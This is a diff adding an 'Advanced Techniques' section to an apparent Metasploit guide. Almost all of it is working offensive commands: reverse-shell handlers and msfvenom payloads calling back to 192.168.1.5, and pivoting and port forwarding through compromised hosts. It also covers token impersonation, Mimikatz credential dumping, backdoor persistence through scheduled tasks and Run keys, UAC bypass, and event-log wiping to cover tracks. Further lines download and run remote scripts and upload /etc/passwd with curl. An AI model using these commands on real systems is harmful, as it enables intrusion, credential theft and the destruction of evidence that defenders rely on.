@@ -2275,6 +2275,347 @@ screenshot
 
 
 
+# 10. Advanced Techniques
+
+- **This section covers methods that go beyond basic exploitation. These techniques assume you already understand core Metasploit functionality.**
+
+---
+
+### 1. Payload Chaining
+
+Run multiple payloads sequentially on the same target.
+
+- **Method 1: Use a script to call multiple payloads
+  Create a resource script that delivers multiple payloads:**
+
+  - multi_payload.rc:
+
+```bash
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4445
+set ExitOnSession false
+run -j
+```
+
+- **Method 2: Meterpreter's execute command
+From an existing session, run another payload:**
+```bash
+meterpreter > upload /path/to/second_payload.exe C:\\Windows\\Temp\\
+meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
+```
+
+## 2. Pivoting (Network Tunneling)
+
+- **Use a compromised host to access networks you can't reach directly.**
+
+ - Step 1: Add route through compromised host
+   ```bash
+   meterpreter > background
+   msf6 > route add 192.168.2.0 255.255.255.0 1
+   ```
+- Step 2: Scan through the pivot
+  ```bash
+  msf6 > use auxiliary/scanner/portscan/tcp
+  set RHOSTS 192.168.2.0/24
+  set PORTS 445
+  run
+  ```
+
+- Step 3: Use socks proxy for external tools
+  ```bash
+  msf6 > use auxiliary/server/socks_proxy
+  set SRVHOST 127.0.0.1
+  set SRVPORT 1080
+  run -j
+  ```
+  - Now configure your tools to use SOCKS proxy 127.0.0.1:1080. Tools like nmap, curl, and proxychains can now reach the remote network through the compromised host.
+
+
+## 3. Port Forwarding
+
+**Create direct tunnels to remote services through the compromised host.**
+
+ - Local port forward (access remote service through your local port):
+  ```bash
+  meterpreter > portfwd add -l 8080 -p 80 -r 192.168.2.20
+  [*] Local TCP relay created: :8080 -> 192.168.2.20:80
+  ```
+  - Now open http://localhost:8080 in your browser to access http://192.168.2.20:80.
+
+- Remote port forward (give remote access to your local service):
+  ```bash
+  meterpreter > portfwd add -L -l 4444 -p 4444 -r 127.0.0.1
+  ```
+- List active forwards:
+  ```bash
+   meterpreter > portfwd list
+  ```
+- Delete a forward:
+  ```bash
+  meterpreter > portfwd delete -l 8080
+  ```
+
+## 4. AutoRunScripts
+
+**Automatically run Meterpreter commands when a session opens.**
+
+- During handler setup:
+  ```bash
+  set AutoRunScript migrate -f
+  ```
+
+- **Common AutoRunScripts:**
+|Script	|Purpose|
+|----|----|
+|migrate -f	|Migrate to a trusted process (e.g., explorer.exe)|
+|run post/windows/gather/hashdump	|Dump hashes immediately|
+|run post/windows/gather/enum_logged_on_users	|Enumerate users|
+|multi_console_command -r /path/to/script.rc	|Run a resource script|
+
+- Multiple commands:
+ ```bash
+ set AutoRunScript migrate -f, post/windows/gather/hashdump
+ ```
+
+## 5. Incognito (Token Manipulation)
+
+**Use stolen tokens to impersonate other users on the system.**
+
+- Load incognito:
+ ```bash
+ meterpreter > load incognito
+ ```
+- List available tokens:
+  ```bash
+  meterpreter > list_tokens -u
+  ```
+- Impersonate a user:
+  ```bash
+  meterpreter > impersonate_token "DOMAIN\\Administrator"
+  ```
+- Impersonate by PID:
+  ```bash
+  meterpreter > steal_token 2468
+  ```
+- Impersonate SYSTEM:
+  ```bash
+  meterpreter > getsystem
+  ```
+- Revert to original token:
+  ```bash
+  meterpreter > rev2self
+  ```
+
+## 6. Kiwi (Mimikatz) Advanced Usage
+
+**Extract credentials from memory.**
+
+- Load kiwi:
+  ```bash
+  meterpreter > load kiwi
+  ```
+- Dump all credentials:
+  ```bash
+  meterpreter > creds_all
+  ```
+- Dump specific credential types:
+  ```bash
+  meterpreter > creds_msv       # SAM hashes
+  meterpreter > creds_kerberos  # Kerberos tickets
+  meterpreter > creds_wdigest   # Plaintext passwords (if available)
+  meterpreter > creds_livessp   # Live SSP credentials
+  ```
+- Get system information from Kiwi:
+  ```bash
+  meterpreter > kiwi_cmd "privilege::debug"
+  meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
+  ```
+
+## 7. Post-Exploitation Modules
+
+**Metasploit has dedicated post-exploitation modules for specific tasks.**
+
+- List post modules:
+  ```bash
+  show post
+  ```
+|Module	|Purpose|
+|----|----|
+|post/windows/gather/hashdump	|Dump SAM hashes|
+|post/windows/gather/enum_logged_on_users	|List logged users|
+|post/windows/gather/checkvm	|Check if target is a VM|
+|post/windows/gather/enum_applications|	List installed software|
+|post/windows/gather/credentials/credential_collector|Collect credentials from various sources|
+|post/linux/gather/enum_configs	|Enumerate Linux config files|
+
+- Run a post module:
+  ```bash
+  use post/windows/gather/hashdump
+  set SESSION 1
+  run
+  ```
+
+
+## 8. Persistence Techniques
+
+**Keep access after reboots.**
+
+- Option 1: Using built-in persistence module
+ ```bash
+ meterpreter > run persistence -A -X -i 10 -p 4444 -r 192.168.1.5
+ ```
+
+|Flag|	Purpose|
+|-A	|Auto-start handler after installation|
+|-X	|Run at system startup (all users)|
+|-i 10	|Reconnect every 10 seconds|
+|-p	|Port to connect to|
+|-r|	Your IP address|
+
+- Option 2: Manual persistence (SchTasks)
+  ```bash
+  meterpreter > execute -f schtasks -a "/create /tn 'WindowsUpdate' /tr 'C:\Windows\Temp\backdoor.exe' /sc onstart /ru SYSTEM"
+  ```
+- Option 3: Registry run key
+  ```bash
+  meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v WindowsUpdate -d C:\\Windows\\Temp\\backdoor.exe
+  ```
+
+## 9. Bypassing UAC (User Account Control)
+
+**If you have a low-priv session, you may need to bypass UAC to get admin access.**
+
+- Search for UAC bypass modules:
+ ```bash
+ search type:exploit name:uac
+ ```
+- Common UAC bypasses:
+  ```bash
+  use exploit/windows/local/ms16_032_secondary_logon_handle
+  set SESSION 1
+  set payload windows/x64/meterpreter/reverse_tcp
+  set LHOST 192.168.1.5
+  run
+  ```
+- Using the bypassuac module:
+  ```bash
+  use exploit/windows/local/bypassuac
+  set SESSION 1
+  run
+  ```
+
+
+## 10. Event Log Manipulation
+
+**Clear or modify logs to cover your tracks.**
+
+- Clear Windows Event Logs:
+  ```bash
+  meterpreter > execute -f wevtutil -a "cl System"
+  meterpreter > execute -f wevtutil -a "cl Security"
+  meterpreter > execute -f wevtutil -a "cl Application"
+  ```
+
+- From PowerShell (more thorough):
+  ```bash
+  powershell -Command "Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }"
+  ```
+
+## 11. Living Off the Land (LotL)
+
+**Use built-in OS tools instead of dropping custom executables.**
+
+- Windows LotL examples:
+ - Execute PowerShell script remotely
+  ```bash
+  powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/run.ps1')"
+  ```
+ - Use Bitsadmin to download file
+  ```bash
+  bitsadmin /transfer job /download /priority high http://192.168.1.5/shell.exe C:\\Windows\\Temp\\shell.exe
+  ```
+ - Use certutil to decode base64 payload
+  ```bash
+  certutil -decode C:\\Windows\\Temp\\encoded.txt C:\\Windows\\Temp\\decoded.exe
+  ```
+
+- Linux LotL examples:
+  - Use wget to download
+  ```bash
+  wget http://192.168.1.5/shell.sh -O /tmp/shell.sh
+  ```
+  - Use curl to upload
+  ```bash
+  curl -F "data=@/etc/passwd" http://192.168.1.5/upload
+  ```
+  - Use python to spawn a shell
+  ```bash
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+
+
+## 12. Meterpreter Stealth Tips
+|Technique	|Command|
+|Migrate to trusted process|	migrate 2528 (explorer.exe)|
+|Clear command history	|clear (from Meterpreter)|
+|Run without logs (PowerShell)	|powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File payload.ps1|
+|Use stageless payloads|set payload windows/x64/meterpreter_reverse_tcp|
+|Encrypt C2 traffic	|Use reverse_https for TLS encryption|
+
+
+
+## 13. Custom Payload Generation with msfvenom
+
+- Create a stageless payload:
+ ```bash
+ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
+ ```
+- Create a payload that executes from memory (no disk):
+ ```bash
+ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe -o /tmp/shell.exe
+ ```
+- Create a payload in a different language:
+ - Python
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f python -o payload.py
+   ```
+ - C
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c -o payload.c
+   ```
+ - PowerShell  
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
+   ```
+
+
+## Advanced Techniques Cheat Sheet
+|Technique|	Key Command|
+|----|----|
+|Pivot	|route add [subnet] [netmask] [session]|
+|Port forward|	portfwd add -l [local] -p [remote] -r [ip]|
+|AutoRunScript	|set AutoRunScript migrate -f|
+|Incognito	|load incognito, impersonate_token [user]|
+|Kiwi|	load kiwi, creds_all|
+|Persistence|	run persistence -A -X -i 10 -p [port] -r [ip]|
+|UAC bypass|	use exploit/windows/local/bypassuac|
+|Clear logs	|wevtutil cl System|
+|LotL download (Windows)	|certutil -decode|
+|Migrate process|	migrate [PID]|
+
+
+
+
 
 
 
